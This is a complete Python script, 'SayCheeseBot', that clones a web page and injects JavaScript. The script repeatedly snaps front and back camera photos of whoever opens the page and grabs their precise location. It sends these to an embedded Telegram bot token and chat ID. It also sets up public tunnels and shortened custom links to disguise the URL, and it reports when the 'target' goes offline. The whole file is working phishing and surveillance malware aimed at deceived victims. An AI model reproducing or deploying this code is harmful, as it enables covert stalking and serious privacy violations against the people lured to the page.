#!/usr/bin/env python3
# lang: Python 3, file: say_bot.py, target: Termux / Linux
# jalankan: python say_bot.py
# dep: pip install flask requests python-telegram-bot

import os, sys, base64, datetime, threading, time
import subprocess, shutil, socket, re, signal, asyncio

try:
    from flask import Flask, request as freq, jsonify
except ImportError:
    print("[!] pip install flask"); sys.exit(1)
try:
    import requests as req_lib
except ImportError:
    print("[!] pip install requests"); sys.exit(1)
try:
    from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (Application, CommandHandler,
                               CallbackQueryHandler, ContextTypes)
except ImportError:
    print("[!] pip install python-telegram-bot"); sys.exit(1)
try:
    from pyngrok import ngrok as _ngrok; PYNGROK = True
except ImportError:
    PYNGROK = False

# ------------------------------------------------------------------ #
#  KONFIGURASI
# ------------------------------------------------------------------ #
BOT_TOKEN = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
CHAT_ID   = "8598136412"

# ------------------------------------------------------------------ #
#  JS INJECT — kirim foto berulang tiap 5 detik + lokasi sekali
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var capCount = 0;
  var active   = true;

  function snapCamera(facingMode, cb) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { cb(null); return; }
    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facingMode } }, audio: false })
    .then(function(stream) {
      var video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline','');
      video.muted = true;
      video.play();
      var fired = false;
      function grab() {
        if (fired) return; fired = true;
        var c = document.createElement('canvas');
        c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
        c.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(function(t){ t.stop(); });
        cb(c.toDataURL('image/jpeg', 0.80).split(',')[1]);
      }
      video.addEventListener('loadeddata', grab);
      setTimeout(function(){ if (!fired){ fired=true; stream.getTracks().forEach(function(t){t.stop();}); cb(null); } }, 5000);
    })
    .catch(function(){ cb(null); });
  }

  function getLocation(cb) {
    if (!navigator.geolocation) { cb(null,null,null); return; }
    navigator.geolocation.getCurrentPosition(
      function(p){ cb(p.coords.latitude, p.coords.longitude, p.coords.accuracy); },
      function(){ cb(null,null,null); },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  }

  function doCapture() {
    if (!active) return;
    capCount++;
    var num = capCount;
    snapCamera('environment', function(back) {
      snapCamera('user', function(front) {
        var payload = { num: num, photo_front: front||null, photo_back: back||null, lat:null, lon:null, acc:null };
        if (num === 1) {
          getLocation(function(lat,lon,acc){
            payload.lat=lat; payload.lon=lon; payload.acc=acc;
            send(payload);
          });
        } else {
          send(payload);
        }
      });
    });
  }

  function send(payload) {
    fetch('/capture', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    }).catch(function(){});
  }

  // ping keepalive — deteksi kalau tab ditutup
  function ping() {
    if (!active) return;
    fetch('/ping', { method:'POST' }).catch(function(){});
  }

  function loop() {
    if (!active) return;
    doCapture();
    setTimeout(loop, 5000);
  }

  setInterval(ping, 3000);

  window.addEventListener('beforeunload', function(){
    active = false;
    navigator.sendBeacon('/offline', '{}');
  });

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loop);
  } else { loop(); }
})();
</script>
"""

# ------------------------------------------------------------------ #
#  STATE
# ------------------------------------------------------------------ #
_page_html  = ""
_pub_url    = ""
_flask_port = 8080
_last_ping  = {}   # session_id → timestamp (pakai IP sebagai key sederhana)
_app_ref    = None # telegram Application

# ------------------------------------------------------------------ #
#  HELPER
# ------------------------------------------------------------------ #
def free_port(start=8080):
    p = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", p)) != 0: return p
            p += 1

def clone_url(url):
    h = {"User-Agent":"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
    r = req_lib.get(url, headers=h, timeout=15); r.raise_for_status(); return r.text

def inject_html(html):
    idx = html.lower().rfind("</body>")
    return (html[:idx] + INJECT_JS + html[idx:]) if idx != -1 else html + INJECT_JS

def save_img(b64, path):
    try:
        with open(path,"wb") as f: f.write(base64.b64decode(b64))
        return True
    except: return False

# ------------------------------------------------------------------ #
#  KIRIM HASIL KE TELEGRAM
# ------------------------------------------------------------------ #
def send_result_thread(data):
    asyncio.run(_send_result(data))

async def _send_result(data):
    bot  = Bot(token=BOT_TOKEN)
    num  = data.get("num", "?")
    lat  = data.get("lat"); lon = data.get("lon"); acc = data.get("acc")
    front= data.get("photo_front"); back = data.get("photo_back")
    ts   = datetime.datetime.now().strftime("%H:%M:%S")

    # header
    header = f"📸 *Capture #{num}* — {ts}"
    if lat and lon:
        maps = f"https://maps.google.com/?q={lat},{lon}"
        header += f"\n📍 `{lat}, {lon}` ± {acc:.0f}m\n[Buka Maps]({maps})"

    await bot.send_message(chat_id=CHAT_ID, text=header, parse_mode="Markdown")

    # lokasi pin (hanya capture pertama)
    if num == 1 and lat and lon:
        await bot.send_location(chat_id=CHAT_ID,
                                latitude=float(lat), longitude=float(lon))

    # foto back
    if back:
        try:
            await bot.send_photo(chat_id=CHAT_ID,
                                 photo=base64.b64decode(back),
                                 caption="📷 Belakang")
        except Exception as e:
            print(f"[!] foto back: {e}")

    # foto front
    if front:
        try:
            await bot.send_photo(chat_id=CHAT_ID,
                                 photo=base64.b64decode(front),
                                 caption="🤳 Depan")
        except Exception as e:
            print(f"[!] foto front: {e}")

    # simpan ke file
    os.makedirs("hasil", exist_ok=True)
    fts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f"hasil/lokasi_{fts}.txt","w") as f:
        f.write(f"Latitude : {lat}\nLongitude: {lon}\nAccuracy : {acc}\n"
                f"Maps     : https://maps.google.com/?q={lat},{lon}\n"
                if lat and lon else "Lokasi tidak didapat.\n")
    if back:  save_img(back,  f"hasil/back_{fts}.jpg")
    if front: save_img(front, f"hasil/front_{fts}.jpg")

async def _send_offline():
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=CHAT_ID,
                           text="🔴 *Target offline* — capture berhenti.",
                           parse_mode="Markdown")

# ------------------------------------------------------------------ #
#  FLASK
# ------------------------------------------------------------------ #
flask_app = Flask(__name__)

@flask_app.route("/")
def index(): return _page_html

@flask_app.route("/capture", methods=["POST"])
def capture():
    data = freq.get_json(silent=True) or {}
    threading.Thread(target=send_result_thread, args=(data,), daemon=True).start()
    return jsonify({"ok": True})

@flask_app.route("/ping", methods=["POST"])
def ping():
    ip = freq.remote_addr
    _last_ping[ip] = time.time()
    return jsonify({"ok": True})

@flask_app.route("/offline", methods=["POST"])
def offline():
    asyncio.run(_send_offline())
    return jsonify({"ok": True})

def run_flask(port):
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ------------------------------------------------------------------ #
#  TUNNEL
# ------------------------------------------------------------------ #
def tunnel_cloudflared(port):
    b = shutil.which("cloudflared")
    if not b:
        print("[!] cloudflared tidak ada. pkg install cloudflared"); return None
    proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1)
    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
    for _ in range(40):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0)
    proc.terminate(); return None

def tunnel_ngrok(port):
    if PYNGROK:
        try:
            t = _ngrok.connect(port,"http")
            return t.public_url.replace("http://","https://")
        except Exception as e:
            print(f"[!] ngrok: {e}")
    if shutil.which("ngrok"):
        subprocess.Popen(["ngrok","http",str(port)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        try:
            r = req_lib.get("http://127.0.0.1:4040/api/tunnels", timeout=3)
            for t in r.json().get("tunnels",[]):
                u = t.get("public_url","")
                if u.startswith("https"): return u
        except: pass
    return None

def tunnel_serveo(port):
    if not shutil.which("ssh"):
        print("[!] ssh tidak ada. pkg install openssh"); return None
    proc = subprocess.Popen(
        ["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=30",
         "-R",f"80:localhost:{port}","serveo.net"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    pat = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
    for _ in range(30):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0)
    proc.terminate(); return None

# ------------------------------------------------------------------ #
#  CUSTOM LINK
# ------------------------------------------------------------------ #
def shorten(long_url, alias):
    for fn in [
        lambda: req_lib.get("https://is.gd/create.php",
                            params={"format":"simple","url":long_url,"shorturl":alias},
                            timeout=8).text.strip(),
        lambda: req_lib.get("https://tinyurl.com/api-create.php",
                            params={"url":long_url,"alias":alias},
                            timeout=8).text.strip(),
    ]:
        try:
            r = fn()
            if r.startswith("http"): return r
        except: continue
    return None

# ------------------------------------------------------------------ #
#  TELEGRAM BOT HANDLERS
# ------------------------------------------------------------------ #
def tunnel_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("☁️ Cloudflared", callback_data="tunnel_cf"),
        InlineKeyboardButton("🔗 Ngrok",        callback_data="tunnel_ng"),
        InlineKeyboardButton("🌐 Serveo",       callback_data="tunnel_sv"),
    ]])

def link_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("📤 Kirim Link", callback_data="send_link"),
        InlineKeyboardButton("🛑 Stop",       callback_data="stop"),
    ]])

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *SayCheeseBot*\n\nPilih tunnel untuk mulai:",
        parse_mode="Markdown",
        reply_markup=tunnel_keyboard()
    )

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _pub_url
    q = update.callback_query
    await q.answer()
    data = q.data

    # --- pilih tunnel ---
    if data in ("tunnel_cf","tunnel_ng","tunnel_sv"):
        await q.edit_message_text("⏳ Membuat tunnel...")

        loop = asyncio.get_event_loop()
        if data == "tunnel_cf":
            url = await loop.run_in_executor(None, tunnel_cloudflared, _flask_port)
        elif data == "tunnel_ng":
            url = await loop.run_in_executor(None, tunnel_ngrok, _flask_port)
        else:
            url = await loop.run_in_executor(None, tunnel_serveo, _flask_port)

        if not url:
            await q.edit_message_text(
                "❌ Tunnel gagal. Coba pilihan lain:",
                reply_markup=tunnel_keyboard()
            )
            return

        _pub_url = url
        await q.edit_message_text(
            f"✅ *Tunnel aktif!*\n\n🔗 `{_pub_url}`\n\nForward link ini ke target.",
            parse_mode="Markdown",
            reply_markup=link_keyboard()
        )

    # --- kirim link ---
    elif data == "send_link":
        if _pub_url:
            await q.message.reply_text(
                f"🔗 *Link aktif:*\n`{_pub_url}`",
                parse_mode="Markdown"
            )
        else:
            await q.answer("Belum ada tunnel aktif.", show_alert=True)

    # --- stop ---
    elif data == "stop":
        await q.edit_message_text("🛑 *Bot dihentikan.*", parse_mode="Markdown")
        await asyncio.sleep(1)
        os.kill(os.getpid(), signal.SIGINT)

# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    global _page_html, _flask_port

    print("\n  SayCheeseBot — Telegram Edition\n")

    # template
    print("[1] Clone URL   [2] File lokal")
    while True:
        p = input("Template (1/2): ").strip()
        if p in ("1","2"): break

    if p == "1":
        url = input("URL: ").strip()
        if not url.startswith("http"): url = "https://" + url
        print(f"[*] Cloning...")
        try:
            raw = clone_url(url); print("[+] OK")
        except Exception as e:
            print(f"[!] {e}"); sys.exit(1)
    else:
        path = input("Path HTML: ").strip().strip('"\'')
        if not os.path.isfile(path):
            print(f"[!] File tidak ditemukan"); sys.exit(1)
        with open(path,"r",encoding="utf-8",errors="replace") as f:
            raw = f.read()
        print("[+] OK")

    _page_html = inject_html(raw)
    _flask_port = free_port(8080)

    # flask di background
    threading.Thread(target=run_flask, args=(_flask_port,), daemon=True).start()
    time.sleep(1.2)
    print(f"[+] Flask jalan di port {_flask_port}")
    print(f"[*] Bot polling... buka @Spyjsbot dan ketik /start\n")

    # telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CallbackQueryHandler(on_button))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
